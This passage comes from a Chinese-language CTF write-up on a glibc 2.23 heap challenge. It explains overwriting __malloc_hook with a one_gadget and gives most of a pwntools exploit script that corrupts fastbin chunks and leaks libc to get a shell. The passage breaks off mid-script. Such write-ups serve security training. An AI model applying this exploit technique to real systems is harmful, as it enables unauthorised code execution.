&lt;p&gt;修改的是下标为 6 所指向的内存地址也就是 0x00007f1d82b46afd 所指向的&lt;/p&gt;
&lt;p&gt;这里因为中断了一下 所以内存地址变了  但还是上面那个 这个是修改前的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220229133.png&#34; alt=&#34;image-20230416220229133&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是修改后的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416221513786.png&#34; alt=&#34;image-20230416221513786&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为是倒序的所以 0d 对应 3 个 00 而 0e 对应两个 00 所以要 p8 (0)*3&lt;/p&gt;
&lt;p&gt;执行代码后，即可修改 **__malloc_hook** 的值，可以看到已经将__malloc_hook 修改为 one_gadget 了。下次调用 malloc 或者 calloc 的时候就可以获得 shell。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r=remote(&#34;node4.buuoj.cn&#34;,28959)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;libc-2.23.so&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;allocate&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fill&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Content: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;4&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\x7f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__malloc_hook&#39;&lt;/span&gt;&lt;span 